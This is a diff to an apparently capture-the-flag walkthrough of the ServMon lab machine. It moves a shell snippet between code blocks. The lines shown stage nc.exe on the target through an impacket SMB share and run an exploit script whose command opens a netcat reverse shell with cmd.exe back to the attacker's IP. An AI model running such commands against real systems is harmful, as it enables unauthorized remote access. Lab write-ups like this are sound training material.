@@ -357,6 +357,11 @@ Use the exploit at: https://www.exploit-db.com/exploits/48360. Note that the app
   
 Need to copy netcat to the machine by starting an SMBserver from a folder hosting it.
 ```bash
+
+┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop/share]
+└─$ ls
+nc.exe
+
 ┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop/share]
 └─$ sudo impacket-smbserver share $(pwd) -smb2support
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -375,10 +380,6 @@ nadine@SERVMON c:\Temp>copy \\10.10.14.31\share\nc.exe .
 ```
 Start a listener and then run the script as follows:
 ```bash
-┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop/share]
-└─$ ls
-nc.exe
-
 ┌──(kali㉿kali)-[10.10.14.31]-[~/Desktop]
 └─$ python3 exploit.py -t 127.0.0.1 -P 9999 -p ew2x6SsGTxjRwXOT -c "c:\temp\nc.exe 10.10.14.31 80 -e cmd.exe"
 [!] Targeting base URL https://127.0.0.1:9999
